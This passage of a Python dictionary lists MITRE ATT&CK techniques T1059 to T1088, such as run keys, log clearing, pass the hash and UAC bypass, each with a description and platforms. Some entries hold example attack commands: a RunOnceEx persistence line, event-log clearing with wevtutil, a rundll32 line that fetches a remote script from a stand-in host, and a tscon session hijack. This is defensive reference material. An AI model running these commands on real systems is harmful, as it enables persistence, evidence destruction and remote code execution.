                          'execute under (local/domain account, SYSTEM, LocalService, or NetworkService).\n'
                          '\n'
                          'Adversaries may also alter Registry keys associated with service failure parameters (such '
                          'as <code>FailureCommand</code>) that may be executed in an elevated context anytime the '
                          'service fails or is intentionally corrupted. (Citation: Twitter Service Recovery Nov 2017)',
           'name': 'Service Registry Permissions Weakness',
           'platforms': ['Windows']},
 'T1059': {'attack_id': 'T1059',
           'categories': ['execution'],
           'description': 'Command-line interfaces provide a way of interacting with computer systems and is a common '
                          'feature across many types of operating system platforms. (Citation: Wikipedia Command-Line '
                          'Interface) One example command-line interface on Windows systems is '
                          '[cmd](https://attack.mitre.org/software/S0106), which can be used to perform a number of '
                          'tasks including execution of other software. Command-line interfaces can be interacted with '
                          'locally or remotely via a remote desktop application, reverse shell session, etc. Commands '
                          'that are executed run with the current permission level of the command-line interface '
                          'process unless the command includes process invocation that changes permissions context for '
                          'that execution (e.g. [Scheduled Task](https://attack.mitre.org/techniques/T1053)).\n'
                          '\n'
                          'Adversaries may use command-line interfaces to interact with systems and execute other '
                          'software during the course of an operation.',
           'name': 'Command-Line Interface',
           'platforms': ['Linux', 'macOS', 'Windows']},
 'T1060': {'attack_id': 'T1060',
           'categories': ['persistence'],
           'description': 'Adding an entry to the "run keys" in the Registry or startup folder will cause the program '
                          'referenced to be executed when a user logs in. (Citation: Microsoft Run Key) These programs '
                          "will be executed under the context of the user and will have the account's associated "
                          'permissions level.\n'
                          '\n'
                          'The following run keys are created by default on Windows systems:\n'
                          '* <code>HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run</code>\n'
                          '* <code>HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce</code>\n'
                          '* <code>HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Run</code>\n'
                          '* <code>HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce</code>\n'
                          '\n'
                          'The '
                          '<code>HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnceEx</code> is '
                          'also available but is not created by default on Windows Vista and newer. Registry run key '
                          'entries can reference programs directly or list them as a dependency. (Citation: Microsoft '
                          'RunOnceEx APR 2018) For example, it is possible to load a DLL at logon using a "Depend" key '
                          'with RunOnceEx: <code>reg add '
                          'HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnceEx\\0001\\Depend /v 1 /d '
                          '"C:\\temp\\evil[.]dll"</code> (Citation: Oddvar Moe RunOnceEx Mar 2018)\n'
                          '\n'
                          'The following Registry keys can be used to set startup folder items for persistence:\n'
                          '* <code>HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\User '
                          'Shell Folders</code>\n'
                          '* <code>HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Shell '
                          'Folders</code>\n'
                          '* <code>HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Shell '
                          'Folders</code>\n'
                          '* <code>HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\User '
                          'Shell Folders</code>\n'
                          '\n'
                          'Adversaries can use these configuration locations to execute malware, such as remote access '
                          'tools, to maintain persistence through system reboots. Adversaries may also use '
                          '[Masquerading](https://attack.mitre.org/techniques/T1036) to make the Registry entries look '
                          'as if they are associated with legitimate programs.',
           'name': 'Registry Run Keys / Startup Folder',
           'platforms': ['Windows']},
 'T1061': {'attack_id': 'T1061',
           'categories': ['execution'],
           'description': 'The Graphical User Interfaces (GUI) is a common way to interact with an operating system. '
                          "Adversaries may use a system's GUI during an operation, commonly through a remote "
                          'interactive session such as [Remote Desktop '
                          'Protocol](https://attack.mitre.org/techniques/T1076), instead of through a [Command-Line '
                          'Interface](https://attack.mitre.org/techniques/T1059), to search for information and '
                          'execute files via mouse double-click events, the Windows Run command (Citation: Wikipedia '
                          'Run Command), or other potentially difficult to monitor interactions.',
           'name': 'Graphical User Interface',
           'platforms': ['Linux', 'macOS', 'Windows']},
 'T1062': {'attack_id': 'T1062',
           'categories': ['persistence'],
           'description': 'A type-1 hypervisor is a software layer that sits between the guest operating systems and '
                          "system's hardware. (Citation: Wikipedia Hypervisor) It presents a virtual running "
                          'environment to an operating system. An example of a common hypervisor is Xen. (Citation: '
                          'Wikipedia Xen) A type-1 hypervisor operates at a level below the operating system and could '
                          'be designed with [Rootkit](https://attack.mitre.org/techniques/T1014) functionality to hide '
                          'its existence from the guest operating system. (Citation: Myers 2007) A malicious '
                          'hypervisor of this nature could be used to persist on systems through interruption.',
           'name': 'Hypervisor',
           'platforms': ['Windows']},
 'T1063': {'attack_id': 'T1063',
           'categories': ['discovery'],
           'description': 'Adversaries may attempt to get a listing of security software, configurations, defensive '
                          'tools, and sensors that are installed on the system. This may include things such as local '
                          'firewall rules and anti-virus. These checks may be built into early-stage remote access '
                          'tools.\n'
                          '\n'
                          '### Windows\n'
                          '\n'
                          'Example commands that can be used to obtain security software information are '
                          '[netsh](https://attack.mitre.org/software/S0108), <code>reg query</code> with '
                          '[Reg](https://attack.mitre.org/software/S0075), <code>dir</code> with '
                          '[cmd](https://attack.mitre.org/software/S0106), and '
                          '[Tasklist](https://attack.mitre.org/software/S0057), but other indicators of discovery '
                          'behavior may be more specific to the type of software or security system the adversary is '
                          'looking for.\n'
                          '\n'
                          '### Mac\n'
                          '\n'
                          "It's becoming more common to see macOS malware perform checks for LittleSnitch and "
                          'KnockKnock software.',
           'name': 'Security Software Discovery',
           'platforms': ['macOS', 'Windows']},
 'T1064': {'attack_id': 'T1064',
           'categories': ['defense-evasion', 'execution'],
           'description': 'Adversaries may use scripts to aid in operations and perform multiple actions that would '
                          'otherwise be manual. Scripting is useful for speeding up operational tasks and reducing the '
                          'time required to gain access to critical resources. Some scripting languages may be used to '
                          'bypass process monitoring mechanisms by directly interacting with the operating system at '
                          'an API level instead of calling other programs. Common scripting languages for Windows '
                          'include VBScript and PowerShell but could also be in the form of command-line batch '
                          'scripts.\n'
                          '\n'
                          'Scripts can be embedded inside Office documents as macros that can be set to execute when '
                          'files used in [Spearphishing Attachment](https://attack.mitre.org/techniques/T1193) and '
                          'other types of spearphishing are opened. Malicious embedded macros are an alternative means '
                          'of execution than software exploitation through [Exploitation for Client '
                          'Execution](https://attack.mitre.org/techniques/T1203), where adversaries will rely on '
                          'macros being allowed or that the user will accept to activate them.\n'
                          '\n'
                          'Many popular offensive frameworks exist which use forms of scripting for security testers '
                          'and adversaries alike. Metasploit (Citation: Metasploit_Ref), Veil (Citation: Veil_Ref), '
                          'and PowerSploit (Citation: Powersploit) are three examples that are popular among '
                          'penetration testers for exploit and post-compromise operations and include many features '
                          'for evading defenses. Some adversaries are known to use PowerShell. (Citation: Alperovitch '
                          '2014)',
           'name': 'Scripting',
           'platforms': ['Linux', 'macOS', 'Windows']},
 'T1065': {'attack_id': 'T1065',
           'categories': ['command-and-control'],
           'description': 'Adversaries may conduct C2 communications over a non-standard port to bypass proxies and '
                          'firewalls that have been improperly configured.',
           'name': 'Uncommonly Used Port',
           'platforms': ['Linux', 'macOS', 'Windows']},
 'T1066': {'attack_id': 'T1066',
           'categories': ['defense-evasion'],
           'description': 'If a malicious tool is detected and quarantined or otherwise curtailed, an adversary may be '
                          'able to determine why the malicious tool was detected (the indicator), modify the tool by '
                          'removing the indicator, and use the updated version that is no longer detected by the '
                          "target's defensive systems or subsequent targets that may use similar systems.\n"
                          '\n'
                          'A good example of this is when malware is detected with a file signature and quarantined by '
                          'anti-virus software. An adversary who can determine that the malware was quarantined '
                          'because of its file signature may use [Software '
                          'Packing](https://attack.mitre.org/techniques/T1045) or otherwise modify the file so it has '
                          'a different signature, and then re-use the malware.',
           'name': 'Indicator Removal from Tools',
           'platforms': ['Linux', 'macOS', 'Windows']},
 'T1067': {'attack_id': 'T1067',
           'categories': ['persistence'],
           'description': 'A bootkit is a malware variant that modifies the boot sectors of a hard drive, including '
                          'the Master Boot Record (MBR) and Volume Boot Record (VBR). (Citation: MTrends 2016)\n'
                          '\n'
                          'Adversaries may use bootkits to persist on systems at a layer below the operating system, '
                          'which may make it difficult to perform full remediation unless an organization suspects one '
                          'was used and can act accordingly.\n'
                          '\n'
                          '### Master Boot Record\n'
                          'The MBR is the section of disk that is first loaded after completing hardware '
                          'initialization by the BIOS. It is the location of the boot loader. An adversary who has raw '
                          'access to the boot drive may overwrite this area, diverting execution during startup from '
                          'the normal boot loader to adversary code. (Citation: Lau 2011)\n'
                          '\n'
                          '### Volume Boot Record\n'
                          'The MBR passes control of the boot process to the VBR. Similar to the case of MBR, an '
                          'adversary who has raw access to the boot drive may overwrite the VBR to divert execution '
                          'during startup to adversary code.',
           'name': 'Bootkit',
           'platforms': ['Linux', 'Windows']},
 'T1068': {'attack_id': 'T1068',
           'categories': ['privilege-escalation'],
           'description': 'Exploitation of a software vulnerability occurs when an adversary takes advantage of a '
                          'programming error in a program, service, or within the operating system software or kernel '
                          'itself to execute adversary-controlled code. Security constructs such as permission levels '
                          'will often hinder access to information and use of certain techniques, so adversaries will '
                          'likely need to perform Privilege Escalation to include use of software exploitation to '
                          'circumvent those restrictions.\n'
                          '\n'
                          'When initially gaining access to a system, an adversary may be operating within a lower '
                          'privileged process which will prevent them from accessing certain resources on the system. '
                          'Vulnerabilities may exist, usually in operating system components and software commonly '
                          'running at higher permissions, that can be exploited to gain higher levels of access on the '
                          'system. This could enable someone to move from unprivileged or user level permissions to '
                          'SYSTEM or root permissions depending on the component that is vulnerable. This may be a '
                          'necessary step for an adversary compromising a endpoint system that has been properly '
                          'configured and limits other privilege escalation methods.',
           'name': 'Exploitation for Privilege Escalation',
           'platforms': ['Linux', 'macOS', 'Windows']},
 'T1069': {'attack_id': 'T1069',
           'categories': ['discovery'],
           'description': 'Adversaries may attempt to find local system or domain-level groups and permissions '
                          'settings. \n'
                          '\n'
                          '### Windows\n'
                          '\n'
                          'Examples of commands that can list groups are <code>net group /domain</code> and <code>net '
                          'localgroup</code> using the [Net](https://attack.mitre.org/software/S0039) utility.\n'
                          '\n'
                          '### Mac\n'
                          '\n'
                          'On Mac, this same thing can be accomplished with the <code>dscacheutil -q group</code> for '
                          'the domain, or <code>dscl . -list /Groups</code> for local groups.\n'
                          '\n'
                          '### Linux\n'
                          '\n'
                          'On Linux, local groups can be enumerated with the <code>groups</code> command and domain '
                          'groups via the <code>ldapsearch</code> command.',
           'name': 'Permission Groups Discovery',
           'platforms': ['Linux', 'macOS', 'Windows']},
 'T1070': {'attack_id': 'T1070',
           'categories': ['defense-evasion'],
           'description': 'Adversaries may delete or alter generated artifacts on a host system, including logs and '
                          'potentially captured files such as quarantined malware. Locations and format of logs will '
                          'vary, but typical organic system logs are captured as Windows events or Linux/macOS files '
                          'such as [Bash History](https://attack.mitre.org/techniques/T1139) and /var/log/* .\n'
                          '\n'
                          'Actions that interfere with eventing and other notifications that can be used to detect '
                          'intrusion activity may compromise the integrity of security solutions, causing events to go '
                          'unreported. They may also make forensic analysis and incident response more difficult due '
                          'to lack of sufficient data to determine what occurred.\n'
                          '\n'
                          '### Clear Windows Event Logs\n'
                          '\n'
                          "Windows event logs are a record of a computer's alerts and notifications. Microsoft defines "
                          'an event as "any significant occurrence in the system or in a program that requires users '
                          'to be notified or an entry added to a log." There are three system-defined sources of '
                          'Events: System, Application, and Security.\n'
                          ' \n'
                          'Adversaries performing actions related to account management, account logon and directory '
                          'service access, etc. may choose to clear the events in order to hide their activities.\n'
                          '\n'
                          'The event logs can be cleared with the following utility commands:\n'
                          '\n'
                          '* <code>wevtutil cl system</code>\n'
                          '* <code>wevtutil cl application</code>\n'
                          '* <code>wevtutil cl security</code>\n'
                          '\n'
                          'Logs may also be cleared through other mechanisms, such as '
                          '[PowerShell](https://attack.mitre.org/techniques/T1086).',
           'name': 'Indicator Removal on Host',
           'platforms': ['Linux', 'macOS', 'Windows']},
 'T1071': {'attack_id': 'T1071',
           'categories': ['command-and-control'],
           'description': 'Adversaries may communicate using a common, standardized application layer protocol such as '
                          'HTTP, HTTPS, SMTP, or DNS to avoid detection by blending in with existing traffic. Commands '
                          'to the remote system, and often the results of those commands, will be embedded within the '
                          'protocol traffic between the client and server.\n'
                          '\n'
                          'For connections that occur internally within an enclave (such as those between a proxy or '
                          'pivot node and other nodes), commonly used protocols are RPC, SSH, or RDP.',
           'name': 'Standard Application Layer Protocol',
           'platforms': ['Linux', 'macOS', 'Windows']},
 'T1072': {'attack_id': 'T1072',
           'categories': ['execution', 'lateral-movement'],
           'description': 'Third-party applications and software deployment systems may be in use in the network '
                          'environment for administration purposes (e.g., SCCM, VNC, HBSS, Altiris, etc.). If an '
                          'adversary gains access to these systems, then they may be able to execute code.\n'
                          '\n'
                          'Adversaries may gain access to and use third-party application deployment systems installed '
                          'within an enterprise network. Access to a network-wide or enterprise-wide software '
                          'deployment system enables an adversary to have remote code execution on all systems that '
                          'are connected to such a system. The access may be used to laterally move to systems, gather '
                          'information, or cause a specific effect, such as wiping the hard drives on all endpoints.\n'
                          '\n'
                          'The permissions required for this action vary by system configuration; local credentials '
                          'may be sufficient with direct access to the deployment server, or specific domain '
                          'credentials may be required. However, the system may require an administrative account to '
                          'log in or to perform software deployment.',
           'name': 'Third-party Software',
           'platforms': ['Linux', 'macOS', 'Windows']},
 'T1073': {'attack_id': 'T1073',
           'categories': ['defense-evasion'],
           'description': 'Programs may specify DLLs that are loaded at runtime. Programs that improperly or vaguely '
                          'specify a required DLL may be open to a vulnerability in which an unintended DLL is loaded. '
                          'Side-loading vulnerabilities specifically occur when Windows Side-by-Side (WinSxS) '
                          'manifests (Citation: MSDN Manifests) are not explicit enough about characteristics of the '
                          'DLL to be loaded. Adversaries may take advantage of a legitimate program that is vulnerable '
                          'to side-loading to load a malicious DLL. (Citation: Stewart 2014)\n'
                          '\n'
                          'Adversaries likely use this technique as a means of masking actions they perform under a '
                          'legitimate, trusted system or software process.',
           'name': 'DLL Side-Loading',
           'platforms': ['Windows']},
 'T1074': {'attack_id': 'T1074',
           'categories': ['collection'],
           'description': 'Collected data is staged in a central location or directory prior to Exfiltration. Data may '
                          'be kept in separate files or combined into one file through techniques such as [Data '
                          'Compressed](https://attack.mitre.org/techniques/T1002) or [Data '
                          'Encrypted](https://attack.mitre.org/techniques/T1022).\n'
                          '\n'
                          'Interactive command shells may be used, and common functionality within '
                          '[cmd](https://attack.mitre.org/software/S0106) and bash may be used to copy data into a '
                          'staging location.',
           'name': 'Data Staged',
           'platforms': ['Linux', 'macOS', 'Windows']},
 'T1075': {'attack_id': 'T1075',
           'categories': ['lateral-movement'],
           'description': 'Pass the hash (PtH) is a method of authenticating as a user without having access to the '
                          "user's cleartext password. This method bypasses standard authentication steps that require "
                          'a cleartext password, moving directly into the portion of the authentication that uses the '
                          'password hash. In this technique, valid password hashes for the account being used are '
                          'captured using a Credential Access technique. Captured hashes are used with PtH to '
                          'authenticate as that user. Once authenticated, PtH may be used to perform actions on local '
                          'or remote systems. \n'
                          '\n'
                          'Windows 7 and higher with KB2871997 require valid domain user credentials or RID 500 '
                          'administrator hashes. (Citation: NSA Spotting)',
           'name': 'Pass the Hash',
           'platforms': ['Windows']},
 'T1076': {'attack_id': 'T1076',
           'categories': ['lateral-movement'],
           'description': 'Remote desktop is a common feature in operating systems. It allows a user to log into an '
                          'interactive session with a system desktop graphical user interface on a remote system. '
                          'Microsoft refers to its implementation of the Remote Desktop Protocol (RDP) as Remote '
                          'Desktop Services (RDS). (Citation: TechNet Remote Desktop Services) There are other '
                          'implementations and third-party tools that provide graphical access [Remote '
                          'Services](https://attack.mitre.org/techniques/T1021) similar to RDS.\n'
                          '\n'
                          'Adversaries may connect to a remote system over RDP/RDS to expand access if the service is '
                          'enabled and allows access to accounts with known credentials. Adversaries will likely use '
                          'Credential Access techniques to acquire credentials to use with RDP. Adversaries may also '
                          'use RDP in conjunction with the [Accessibility '
                          'Features](https://attack.mitre.org/techniques/T1015) technique for Persistence. (Citation: '
                          'Alperovitch Malware)\n'
                          '\n'
                          'Adversaries may also perform RDP session hijacking which involves stealing a legitimate '
                          "user's remote session. Typically, a user is notified when someone else is trying to steal "
                          'their session and prompted with a question. With System permissions and using Terminal '
                          'Services Console, <code>c:\\windows\\system32\\tscon.exe [session number to be '
                          'stolen]</code>, an adversary can hijack a session without the need for credentials or '
                          'prompts to the user. (Citation: RDP Hijacking Korznikov) This can be done remotely or '
                          'locally and with active or disconnected sessions. (Citation: RDP Hijacking Medium) It can '
                          'also lead to [Remote System Discovery](https://attack.mitre.org/techniques/T1018) and '
                          'Privilege Escalation by stealing a Domain Admin or higher privileged account session. All '
                          'of this can be done by using native Windows commands, but it has also been added as a '
                          'feature in RedSnarf. (Citation: Kali Redsnarf)',
           'name': 'Remote Desktop Protocol',
           'platforms': ['Windows']},
 'T1077': {'attack_id': 'T1077',
           'categories': ['lateral-movement'],
           'description': 'Windows systems have hidden network shares that are accessible only to administrators and '
                          'provide the ability for remote file copy and other administrative functions. Example '
                          'network shares include <code>C$</code>, <code>ADMIN$</code>, and <code>IPC$</code>. \n'
                          '\n'
                          'Adversaries may use this technique in conjunction with administrator-level [Valid '
                          'Accounts](https://attack.mitre.org/techniques/T1078) to remotely access a networked system '
                          'over server message block (SMB) (Citation: Wikipedia SMB) to interact with systems using '
                          'remote procedure calls (RPCs), (Citation: TechNet RPC) transfer files, and run transferred '
                          'binaries through remote Execution. Example execution techniques that rely on authenticated '
                          'sessions over SMB/RPC are [Scheduled Task](https://attack.mitre.org/techniques/T1053), '
                          '[Service Execution](https://attack.mitre.org/techniques/T1035), and [Windows Management '
                          'Instrumentation](https://attack.mitre.org/techniques/T1047). Adversaries can also use NTLM '
                          'hashes to access administrator shares on systems with [Pass the '
                          'Hash](https://attack.mitre.org/techniques/T1075) and certain configuration and patch '
                          'levels. (Citation: Microsoft Admin Shares)\n'
                          '\n'
                          'The [Net](https://attack.mitre.org/software/S0039) utility can be used to connect to '
                          'Windows admin shares on remote systems using <code>net use</code> commands with valid '
                          'credentials. (Citation: Technet Net Use)',
           'name': 'Windows Admin Shares',
           'platforms': ['Windows']},
 'T1078': {'attack_id': 'T1078',
           'categories': ['defense-evasion', 'persistence', 'privilege-escalation', 'initial-access'],
           'description': 'Adversaries may steal the credentials of a specific user or service account using '
                          'Credential Access techniques or capture credentials earlier in their reconnaissance process '
                          'through social engineering for means of gaining Initial Access. \n'
                          '\n'
                          'Accounts that an adversary may use can fall into three categories: default, local, and '
                          'domain accounts. Default accounts are those that are built-into an OS such as Guest or '
                          'Administrator account on Windows systems or default factory/provider set accounts on other '
                          'types of systems, software, or devices. Local accounts are those configured by an '
                          'organization for use by users, remote support, services, or for administration on a single '
                          'system or service. (Citation: Microsoft Local Accounts Feb 2019) Domain accounts are those '
                          'managed by Active Directory Domain Services where access and permissions are configured '
                          'across systems and services that are part of that domain. Domain accounts can cover users, '
                          'administrators, and services.\n'
                          '\n'
                          'Compromised credentials may be used to bypass access controls placed on various resources '
                          'on systems within the network and may even be used for persistent access to remote systems '
                          'and externally available services, such as VPNs, Outlook Web Access and remote desktop. '
                          'Compromised credentials may also grant an adversary increased privilege to specific systems '
                          'or access to restricted areas of the network. Adversaries may choose not to use malware or '
                          'tools in conjunction with the legitimate access those credentials provide to make it harder '
                          'to detect their presence.\n'
                          '\n'
                          'Default accounts are also not limited to Guest and Administrator on client machines, they '
                          'also include accounts that are preset for equipment such as network devices and computer '
                          'applications whether they are internal, open source, or COTS. Appliances that come preset '
                          'with a username and password combination pose a serious threat to organizations that do not '
                          'change it post installation, as they are easy targets for an adversary. Similarly, '
                          'adversaries may also utilize publicly disclosed private keys, or stolen private keys, to '
                          'legitimately connect to remote environments via [Remote '
                          'Services](https://attack.mitre.org/techniques/T1021) (Citation: Metasploit SSH Module)\n'
                          '\n'
                          'The overlap of account access, credentials, and permissions across a network of systems is '
                          'of concern because the adversary may be able to pivot across accounts and systems to reach '
                          'a high level of access (i.e., domain or enterprise administrator) to bypass access controls '
                          'set within the enterprise. (Citation: TechNet Credential Theft)',
           'name': 'Valid Accounts',
           'platforms': ['Linux', 'macOS', 'Windows']},
 'T1079': {'attack_id': 'T1079',
           'categories': ['command-and-control'],
           'description': 'An adversary performs C2 communications using multiple layers of encryption, typically (but '
                          'not exclusively) tunneling a custom encryption scheme within a protocol encryption scheme '
                          'such as HTTPS or SMTPS.',
           'name': 'Multilayer Encryption',
           'platforms': ['Linux', 'macOS', 'Windows']},
 'T1080': {'attack_id': 'T1080',
           'categories': ['lateral-movement'],
           'description': 'Content stored on network drives or in other shared locations may be tainted by adding '
                          'malicious programs, scripts, or exploit code to otherwise valid files. Once a user opens '
                          "the shared tainted content, the malicious portion can be executed to run the adversary's "
                          'code on a remote system. Adversaries may use tainted shared content to move laterally.\n'
                          '\n'
                          'A directory share pivot is a variation on this technique that uses several other techniques '
                          'to propagate malware when users access a shared network directory. It uses [Shortcut '
                          'Modification](https://attack.mitre.org/techniques/T1023) of directory .LNK files that use '
                          '[Masquerading](https://attack.mitre.org/techniques/T1036) to look like the real '
                          'directories, which are hidden through [Hidden Files and '
                          'Directories](https://attack.mitre.org/techniques/T1158). The malicious .LNK-based '
                          'directories have an embedded command that executes the hidden malware file in the directory '
                          "and then opens the real intended directory so that the user's expected action still occurs. "
                          'When used with frequently used network directories, the technique may result in frequent '
                          'reinfections and broad access to systems and potentially to new and higher privileged '
                          'accounts. (Citation: Retwin Directory Share Pivot)',
           'name': 'Taint Shared Content',
           'platforms': ['Windows']},
 'T1081': {'attack_id': 'T1081',
           'categories': ['credential-access'],
           'description': 'Adversaries may search local file systems and remote file shares for files containing '
                          'passwords. These can be files created by users to store their own credentials, shared '
                          'credential stores for a group of individuals, configuration files containing passwords for '
                          'a system or service, or source code/binary files containing embedded passwords.\n'
                          '\n'
                          'It is possible to extract passwords from backups or saved virtual machines through '
                          '[Credential Dumping](https://attack.mitre.org/techniques/T1003). (Citation: CG 2014) '
                          'Passwords may also be obtained from Group Policy Preferences stored on the Windows Domain '
                          'Controller. (Citation: SRD GPP)',
           'name': 'Credentials in Files',
           'platforms': ['Linux', 'macOS', 'Windows']},
 'T1082': {'attack_id': 'T1082',
           'categories': ['discovery'],
           'description': 'An adversary may attempt to get detailed information about the operating system and '
                          'hardware, including version, patches, hotfixes, service packs, and architecture.\n'
                          '\n'
                          '### Windows\n'
                          '\n'
                          'Example commands and utilities that obtain this information include <code>ver</code>, '
                          '[Systeminfo](https://attack.mitre.org/software/S0096), and <code>dir</code> within '
                          '[cmd](https://attack.mitre.org/software/S0106) for identifying information based on present '
                          'files and directories.\n'
                          '\n'
                          '### Mac\n'
                          '\n'
                          'On Mac, the <code>systemsetup</code> command gives a detailed breakdown of the system, but '
                          'it requires administrative privileges. Additionally, the <code>system_profiler</code> gives '
                          'a very detailed breakdown of configurations, firewall rules, mounted volumes, hardware, and '
                          'many other things without needing elevated permissions.',
           'name': 'System Information Discovery',
           'platforms': ['Linux', 'macOS', 'Windows']},
 'T1083': {'attack_id': 'T1083',
           'categories': ['discovery'],
           'description': 'Adversaries may enumerate files and directories or may search in specific locations of a '
                          'host or network share for certain information within a file system. \n'
                          '\n'
                          '### Windows\n'
                          '\n'
                          'Example utilities used to obtain this information are <code>dir</code> and '
                          '<code>tree</code>. (Citation: Windows Commands JPCERT) Custom tools may also be used to '
                          'gather file and directory information and interact with the Windows API.\n'
                          '\n'
                          '### Mac and Linux\n'
                          '\n'
                          'In Mac and Linux, this kind of discovery is accomplished with the <code>ls</code>, '
                          '<code>find</code>, and <code>locate</code> commands.',
           'name': 'File and Directory Discovery',
           'platforms': ['Linux', 'macOS', 'Windows']},
 'T1084': {'attack_id': 'T1084',
           'categories': ['persistence'],
           'description': 'Windows Management Instrumentation (WMI) can be used to install event filters, providers, '
                          'consumers, and bindings that execute code when a defined event occurs. Adversaries may use '
                          'the capabilities of WMI to subscribe to an event and execute arbitrary code when that event '
                          'occurs, providing persistence on a system. Adversaries may attempt to evade detection of '
                          'this technique by compiling WMI scripts. (Citation: Dell WMI Persistence) Examples of '
                          "events that may be subscribed to are the wall clock time or the computer's uptime. "
                          '(Citation: Kazanciyan 2014) Several threat groups have reportedly used this technique to '
                          'maintain persistence. (Citation: Mandiant M-Trends 2015)',
           'name': 'Windows Management Instrumentation Event Subscription',
           'platforms': ['Windows']},
 'T1085': {'attack_id': 'T1085',
           'categories': ['defense-evasion', 'execution'],
           'description': 'The rundll32.exe program can be called to execute an arbitrary binary. Adversaries may take '
                          'advantage of this functionality to proxy execution of code to avoid triggering security '
                          'tools that may not monitor execution of the rundll32.exe process because of whitelists or '
                          'false positives from Windows using rundll32.exe for normal operations.\n'
                          '\n'
                          'Rundll32.exe can be used to execute Control Panel Item files (.cpl) through the '
                          'undocumented shell32.dll functions <code>Control_RunDLL</code> and '
                          '<code>Control_RunDLLAsUser</code>. Double-clicking a .cpl file also causes rundll32.exe to '
                          'execute. (Citation: Trend Micro CPL)\n'
                          '\n'
                          'Rundll32 can also been used to execute scripts such as JavaScript. This can be done using a '
                          'syntax similar to this: <code>rundll32.exe javascript:"\\..\\mshtml,RunHTMLApplication '
                          '";document.write();GetObject("script:https[:]//www[.]example[.]com/malicious.sct")"</code>  '
                          'This behavior has been seen used by malware such as Poweliks. (Citation: This is Security '
                          'Command Line Confusion)',
           'name': 'Rundll32',
           'platforms': ['Windows']},
 'T1086': {'attack_id': 'T1086',
           'categories': ['execution'],
           'description': 'PowerShell is a powerful interactive command-line interface and scripting environment '
                          'included in the Windows operating system. (Citation: TechNet PowerShell) Adversaries can '
                          'use PowerShell to perform a number of actions, including discovery of information and '
                          'execution of code. Examples include the Start-Process cmdlet which can be used to run an '
                          'executable and the Invoke-Command cmdlet which runs a command locally or on a remote '
                          'computer. \n'
                          '\n'
                          'PowerShell may also be used to download and run executables from the Internet, which can be '
                          'executed from disk or in memory without touching disk.\n'
                          '\n'
                          'Administrator permissions are required to use PowerShell to connect to remote systems.\n'
                          '\n'
                          'A number of PowerShell-based offensive testing tools are available, including '
                          '[Empire](https://attack.mitre.org/software/S0363),  PowerSploit, (Citation: Powersploit) '
                          'and PSAttack. (Citation: Github PSAttack)\n'
                          '\n'
                          'PowerShell commands/scripts can also be executed without directly invoking the '
                          "powershell.exe binary through interfaces to PowerShell's underlying "
                          'System.Management.Automation assembly exposed through the .NET framework and Windows Common '
                          'Language Interface (CLI). (Citation: Sixdub PowerPick Jan 2016)(Citation: SilentBreak '
                          'Offensive PS Dec 2015) (Citation: Microsoft PSfromCsharp APR 2014)',
           'name': 'PowerShell',
           'platforms': ['Windows']},
 'T1087': {'attack_id': 'T1087',
           'categories': ['discovery'],
           'description': 'Adversaries may attempt to get a listing of local system or domain accounts. \n'
                          '\n'
                          '### Windows\n'
                          '\n'
                          'Example commands that can acquire this information are <code>net user</code>, <code>net '
                          'group <groupname></code>, and <code>net localgroup <groupname></code> using the '
                          '[Net](https://attack.mitre.org/software/S0039) utility or through use of '
                          '[dsquery](https://attack.mitre.org/software/S0105). If adversaries attempt to identify the '
                          'primary user, currently logged in user, or set of users that commonly uses a system, '
                          '[System Owner/User Discovery](https://attack.mitre.org/techniques/T1033) may apply.\n'
                          '\n'
                          '### Mac\n'
                          '\n'
                          'On Mac, groups can be enumerated through the <code>groups</code> and <code>id</code> '
                          'commands. In mac specifically, <code>dscl . list /Groups</code> and <code>dscacheutil -q '
                          'group</code> can also be used to enumerate groups and users.\n'
                          '\n'
                          '### Linux\n'
                          '\n'
                          'On Linux, local users can be enumerated through the use of the <code>/etc/passwd</code> '
                          'file which is world readable. In mac, this same file is only used in single-user mode in '
                          'addition to the <code>/etc/master.passwd</code> file.\n'
                          '\n'
                          'Also, groups can be enumerated through the <code>groups</code> and <code>id</code> '
                          'commands.',
           'name': 'Account Discovery',
           'platforms': ['Linux', 'macOS', 'Windows']},
 'T1088': {'attack_id': 'T1088',
           'categories': ['defense-evasion', 'privilege-escalation'],
           'description': 'Windows User Account Control (UAC) allows a program to elevate its privileges to perform a '
                          'task under administrator-level permissions by prompting the user for confirmation. The '
                          'impact to the user ranges from denying the operation under high enforcement to allowing the '
                          'user to perform the action if they are in the local administrators group and click through '
                          'the prompt or allowing them to enter an administrator password to complete the action. '
                          '(Citation: TechNet How UAC Works)\n'
                          '\n'
                          'If the UAC protection level of a computer is set to anything but the highest level, certain '
                          'Windows programs are allowed to elevate privileges or execute some elevated COM objects '
                          'without prompting the user through the UAC notification box. (Citation: TechNet Inside UAC) '
                          '(Citation: MSDN COM Elevation) An example of this is use of rundll32.exe to load a '
                          'specifically crafted DLL which loads an auto-elevated COM object and performs a file '
                          'operation in a protected directory which would typically require elevated access. Malicious '
                          'software may also be injected into a trusted process to gain elevated privileges without '
                          'prompting a user. (Citation: Davidson Windows) Adversaries can use these techniques to '
                          'elevate privileges to administrator if the target process is unprotected.\n'
                          '\n'
                          'Many methods have been discovered to bypass UAC. The Github readme page for UACMe contains '
                          'an extensive list of methods (Citation: Github UACMe) that have been discovered and '
                          'implemented within UACMe, but may not be a comprehensive list of bypasses. Additional '
                          'bypass methods are regularly discovered and some used in the wild, such as:\n'
                          '\n'
                          '* <code>eventvwr.exe</code> can auto-elevate and execute a specified binary or script. '
                          '(Citation: enigma0x3 Fileless UAC Bypass) (Citation: Fortinet Fareit)\n'
                          '\n'
                          'Another bypass is possible through some Lateral Movement techniques if credentials for an '
                          'account with administrator privileges are known, since UAC is a single system security '
                          'mechanism, and the privilege or integrity of a process running on one system will be '
                          'unknown on lateral systems and default to high integrity. (Citation: SANS UAC Bypass)',
